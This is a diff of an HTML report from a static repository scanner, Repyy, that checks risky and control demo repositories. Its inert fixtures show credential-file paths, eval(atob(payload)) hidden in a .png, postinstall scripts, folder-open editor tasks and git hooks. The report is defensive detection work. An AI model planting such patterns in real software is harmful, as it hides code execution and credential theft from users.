-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 94 B</p></section></article><article class="repo" aria-label="Repository review for demo/credential-path/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/credential-path/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">1</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: CRED-001 at marker.js:1.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>1</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>1</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>1 total findings</span><span>1 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>1 review</span><span>0 harden</span><span>0 informational</span><span>106 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/credential-path/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="cred-001 credential-harvesting marker.js access to sensitive credential storage const marker = &#39;/repyy_fake_home/.aws/credentials&#39;; review marker.js const marker = &#39;/repyy_fake_home/.aws/credentials&#39;;" data-severity="high" data-confidence="high" data-disposition="review" data-category="credential-harvesting" data-rule="CRED-001" data-file="marker.js"><header class="finding-head"><div><h3>CRED-001 · Access to sensitive credential storage</h3><p class="tags"><span>high</span><span>high confidence</span><span>review</span><span>executable</span><span>credential-harvesting</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;/REPYY_FAKE_HOME/.aws/credentials&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies credential harvesting behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Do not run the repository. Verify the source and intent in an isolated environment.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/credential-path/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="marker.js"><span>marker.js</span><span>1 findings · highest high</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 106 B</p></section></article><article class="repo" aria-label="Repository review for demo/credential-path/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/credential-path/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">1</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: ENV-001 at marker.js:1.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>1 total findings</span><span>0 high total</span><span>1 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>1 informational</span><span>89 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/credential-path/control"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="env-001 environment-access marker.js broad environment-variable access const mode = process.env.node_env; informational marker.js const mode = process.env.node_env;" data-severity="medium" data-confidence="low" data-disposition="informational" data-category="environment-access" data-rule="ENV-001" data-file="marker.js"><header class="finding-head"><div><h3>ENV-001 · Broad environment-variable access</h3><p class="tags"><span>medium</span><span>low confidence</span><span>informational</span><span>executable</span><span>environment-access</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence"><code>const mode = process.env.NODE_ENV;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies environment access behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>Applications commonly read explicitly named configuration variables.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/credential-path/control"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="marker.js"><span>marker.js</span><span>1 findings · highest medium</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 89 B</p></section></article><article class="repo" aria-label="Repository review for demo/docker-socket/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/docker-socket/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">1</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: DOCKER-001 at compose.yaml:5.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>1</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>1</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>1 total findings</span><span>1 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>1 review</span><span>0 harden</span><span>0 informational</span><span>191 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/docker-socket/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="docker-001 container-risk compose.yaml container configuration exposes host control - [redacted] review compose.yaml - [redacted]" data-severity="high" data-confidence="medium" data-disposition="review" data-category="container-risk" data-rule="DOCKER-001" data-file="compose.yaml"><header class="finding-head"><div><h3>DOCKER-001 · Container configuration exposes host control</h3><p class="tags"><span>high</span><span>medium confidence</span><span>review</span><span>executable</span><span>container-risk</span></p></div><span aria-label="2 occurrences">2 occurrences</span></header><div class="location"><strong>compose.yaml:5</strong><pre aria-label="Redacted evidence"><code>- [REDACTED]</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies container risk behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> Dockerfile, Dockerfile.*, docker-compose*.yml, docker-compose*.yaml, compose*.yml, compose*.yaml</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/docker-socket/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="compose.yaml"><span>compose.yaml</span><span>1 findings · highest high</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 191 B</p></section></article><article class="repo" aria-label="Repository review for demo/docker-socket/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/docker-socket/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>162 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/docker-socket/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/docker-socket/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 162 B</p></section></article>
-<footer class="muted report-footer">Findings are repository evidence, not proof that code executed or a host was compromised. Runtime behavior, host processes and credential stores, remote CI logs, and network traffic are not inspected. Repyy performs static analysis. A result with no relevant findings does not prove that the repository is safe.</footer></main><script>(() => {
+<article class="repo" aria-label="Repository review for demo/lifecycle/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/lifecycle/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: PKG-001 at package.json:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>0 high total</span>
+<span>1 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>129 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/lifecycle/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="pkg-001 package-lifecycle package.json package lifecycle script: postinstall echo repyy_inert_lifecycle review package.json echo repyy_inert_lifecycle" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="package-lifecycle" data-rule="PKG-001" data-file="package.json">
+<header class="finding-head">
+<div>
+<h3>PKG-001 · Package lifecycle script: postinstall</h3>
+<p class="tags">
+<span>medium</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>manifest-hook</span>
+<span>package-lifecycle</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>package.json:1</strong><pre aria-label="Redacted evidence">
+<code>echo REPYY_INERT_LIFECYCLE</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies package lifecycle behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> package.json and supported dependency manifests</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Review this script before installing dependencies.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/lifecycle/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="package.json">
+<span>package.json</span>
+<span>1 findings · highest medium</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 129 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/lifecycle/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/lifecycle/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>114 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/lifecycle/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/lifecycle/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 114 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/startup/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/startup/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: IMPORT-001 at postcss.config.cjs:2.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>4</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>1 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>173 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/startup/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="import-001 dynamic-import postcss.config.cjs dynamic import or require assembled at runtime require(markerpath); review postcss.config.cjs require(markerpath);" data-severity="high" data-confidence="medium" data-disposition="review" data-category="dynamic-import" data-rule="IMPORT-001" data-file="postcss.config.cjs">
+<header class="finding-head">
+<div>
+<h3>IMPORT-001 · Dynamic import or require assembled at runtime</h3>
+<p class="tags">
+<span>high</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>dynamic-import</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>postcss.config.cjs:2</strong><pre aria-label="Redacted evidence">
+<code>require(markerPath);</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies dynamic import behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> *.js, *.cjs, *.mjs, *.jsx, *.ts, *.tsx, *.py, *.java, *.kt</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/startup/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="postcss.config.cjs">
+<span>postcss.config.cjs</span>
+<span>1 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 4 files · 173 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/startup/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/startup/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>88 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/startup/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/startup/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 88 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/disguised-asset/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/disguised-asset/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">2</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: EXEC-001 at banner.png:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>2</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>2 total findings</span>
+<span>1 high total</span>
+<span>1 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>2 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>92 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/disguised-asset/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="exec-001 dynamic-execution banner.png dynamic code execution primitive const marker = &#39;eval(atob(payload))&#39;; review banner.png const marker = &#39;eval(atob(payload))&#39;;" data-severity="high" data-confidence="medium" data-disposition="review" data-category="dynamic-execution" data-rule="EXEC-001" data-file="banner.png">
+<header class="finding-head">
+<div>
+<h3>EXEC-001 · Dynamic code execution primitive</h3>
+<p class="tags">
+<span>high</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>dynamic-execution</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>banner.png:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;eval(atob(payload))&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies dynamic execution behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>Frameworks and developer tools sometimes evaluate generated or sandboxed code.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article><article class="finding" data-finding data-search="obfs-002 string-obfuscation banner.png string decoding or character-code construction const marker = &#39;eval(atob(payload))&#39;; review banner.png const marker = &#39;eval(atob(payload))&#39;;" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="string-obfuscation" data-rule="OBFS-002" data-file="banner.png">
+<header class="finding-head">
+<div>
+<h3>OBFS-002 · String decoding or character-code construction</h3>
+<p class="tags">
+<span>medium</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>string-obfuscation</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>banner.png:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;eval(atob(payload))&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies string obfuscation behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/disguised-asset/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="banner.png">
+<span>banner.png</span>
+<span>2 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 92 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/disguised-asset/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/disguised-asset/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>154 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/disguised-asset/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/disguised-asset/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 154 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/folder-open/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/folder-open/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: IDE-001 at .vscode/tasks.json:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>1 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>216 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/folder-open/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="ide-001 editor-auto-execution .vscode/tasks.json editor configuration can execute a command automatically {&#34;version&#34;: &#34;2.0.0&#34;, &#34;tasks&#34;: [{&#34;label&#34;: &#34;inert fixture&#34;, &#34;type&#34;: &#34;process&#34;, &#34;command&#34;: &#34;repyy_nonexistent_inert_marker&#34;, &#34;runoptions&#34;: {&#34;runon&#34;: &#34;folderopen&#34;}}… review .vscode/tasks.json {&#34;version&#34;: &#34;2.0.0&#34;, &#34;tasks&#34;: [{&#34;label&#34;: &#34;inert fixture&#34;, &#34;type&#34;: &#34;process&#34;, &#34;command&#34;: &#34;repyy_nonexistent_inert_marker&#34;, &#34;runoptions&#34;: {&#34;runon&#34;: &#34;folderopen&#34;}}…" data-severity="high" data-confidence="high" data-disposition="review" data-category="editor-auto-execution" data-rule="IDE-001" data-file=".vscode/tasks.json">
+<header class="finding-head">
+<div>
+<h3>IDE-001 · Editor configuration can execute a command automatically</h3>
+<p class="tags">
+<span>high</span>
+<span>high confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>editor-auto-execution</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>.vscode/tasks.json:1</strong><pre aria-label="Redacted evidence">
+<code>{&#34;version&#34;: &#34;2.0.0&#34;, &#34;tasks&#34;: [{&#34;label&#34;: &#34;Inert fixture&#34;, &#34;type&#34;: &#34;process&#34;, &#34;command&#34;: &#34;REPYY_NONEXISTENT_INERT_MARKER&#34;, &#34;runOptions&#34;: {&#34;runOn&#34;: &#34;folderOpen&#34;}}…</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies editor auto execution behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> tasks.json, settings.json, devcontainer.json, *.code-workspace, *.xml</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Do not run the repository. Verify the source and intent in an isolated environment.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/folder-open/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file=".vscode/tasks.json">
+<span>.vscode/tasks.json</span>
+<span>1 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 216 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/folder-open/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/folder-open/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>177 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/folder-open/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/folder-open/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 177 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/git-hook/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/git-hook/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">2</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: GITHOOK-001 at .git/hooks/pre-commit:2.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>2 total findings</span>
+<span>1 high total</span>
+<span>0 medium</span>
+<span>1 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>1 informational</span>
+<span>122 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/git-hook/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="githook-001 git-hook .git/hooks/pre-commit executable git hook or hooks-path override # inert pre-commit fixture review .git/hooks/pre-commit # inert pre-commit fixture" data-severity="high" data-confidence="medium" data-disposition="review" data-category="git-hook" data-rule="GITHOOK-001" data-file=".git/hooks/pre-commit">
+<header class="finding-head">
+<div>
+<h3>GITHOOK-001 · Executable Git hook or hooks-path override</h3>
+<p class="tags">
+<span>high</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>git-hook</span>
+<span>git-hook</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
